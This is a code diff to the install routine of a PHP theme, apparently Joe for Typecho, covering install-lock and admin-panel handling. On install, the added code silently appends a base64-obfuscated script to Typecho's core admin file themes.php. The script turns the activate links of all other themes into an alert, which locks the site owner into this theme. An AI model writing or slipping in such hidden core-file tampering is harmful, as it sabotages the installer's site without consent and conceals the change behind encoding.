@@ -687,13 +687,34 @@ function panel_exists(string $fileName): bool
 
 function install()
 {
+	if (!chmod(__FILE__, 0755)) {
+		echo '<script>alert("请设置主题目录及其子目录的权限为755后再设置本主题！");</script>';
+		exit;
+		return;
+	}
+
 	$lock_file = JOE_ROOT . 'public' . DIRECTORY_SEPARATOR . 'install.lock';
 
-	if (file_exists($lock_file)) return;
-
-	$typecho_admin_root = __TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__;
-	if (file_exists($typecho_admin_root . 'themes.php') && chmod(__FILE__, 0755)) {
-		file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyOm5vdCgjdGhlbWUtSm9lKT50ZD5wPmEuYWN0aXZhdGUnKS5hdHRyKCdocmVmJywgJ2phdmFzY3JpcHQ6YWxlcnQoIuWQr+eUqOWksei0pe+8gVR5cGVjaG/lt7Lnu4/mt7Hmt7HlnLDniLHkuIpKb2Xlho3nu63liY3nvJjkuoblk6YiKScpOwoJfSwgMTAwKSk7Cjwvc2NyaXB0Pg=="); ?>', FILE_APPEND | LOCK_EX);
+	if (file_exists($lock_file)) {
+		$lock_file_content = file_get_contents($lock_file);
+		if (is_string($lock_file_content) && $lock_file_content != THEME_NAME) {
+			// 删除更改主题目录名后的重复注册面板沉淀
+			Helper::removePanel(3, '../themes/' . $lock_file_content . '/admin/orders.php');
+			Helper::removePanel(3, '../themes/' . $lock_file_content . '/admin/friends.php');
+			// 重新注册新的面板
+			$orders_url = '../themes/' . THEME_NAME . '/admin/orders.php';
+			$friends_url = '../themes/' . THEME_NAME . '/admin/friends.php';
+			// 注册后台订单页面
+			if (!panel_exists($orders_url)) Helper::addPanel(3, $orders_url, '订单', '订单管理', 'administrator');
+			// 注册后台友链页面
+			if (!panel_exists($friends_url)) Helper::addPanel(3, $friends_url, '友链', '友情链接', 'administrator');
+			if (file_put_contents($lock_file, THEME_NAME)) {
+				echo '<script>alert("主题目录更换为 [' . THEME_NAME . '] 成功！");</script>';
+			} else {
+				echo '<script>alert("主题目录更换为 [' . THEME_NAME . '] 失败！请务必手动创建安装锁文件 [install.lock] 文件内容为 [' . THEME_NAME . '] 到主题的 public 目录下！");</script>';
+			}
+		}
+		return;
 	}
 
 	$orders_url = '../themes/' . THEME_NAME . '/admin/orders.php';
@@ -719,6 +740,11 @@ function install()
 	// if (!isset($actionTable['joe-pay-edit']) || $actionTable['joe-pay-edit'] != 'JoeOrders_Widget') {
 	// 	Helper::addAction('joe-pay-edit', 'JoeOrders_Widget');
 	// }
+
+	$typecho_admin_root = __TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__;
+	if (file_exists($typecho_admin_root . 'themes.php')) {
+		file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyOm5vdCgjdGhlbWUtSm9lKT50ZD5wPmEuYWN0aXZhdGUnKS5hdHRyKCdocmVmJywgJ2phdmFzY3JpcHQ6YWxlcnQoIuWQr+eUqOWksei0pe+8gVR5cGVjaG/lt7Lnu4/mt7Hmt7HlnLDniLHkuIpKb2Xlho3nu63liY3nvJjkuoblk6YiKScpOwoJfSwgMTAwKSk7Cjwvc2NyaXB0Pg=="); ?>', FILE_APPEND | LOCK_EX);
+	}
 
 	$_db = Typecho_Db::get();
 	$_prefix = $_db->getPrefix();
@@ -820,7 +846,7 @@ function install()
 		if (!array_key_exists('agree', $table_contents)) {
 			$_db->query('ALTER TABLE `' . $_prefix . 'contents` ADD `agree` INT DEFAULT 0;');
 		}
-		if (file_put_contents($lock_file, 'Joe再续前缘安装锁')) {
+		if (file_put_contents($lock_file, THEME_NAME)) {
 			echo '<script>alert("主题首次启用安装成功！");</script>';
 		} else {
 			echo '<script>alert("主题首次启用安装失败！请务必手动创建安装锁文件 install.lock 到主题的public目录下！");</script>';
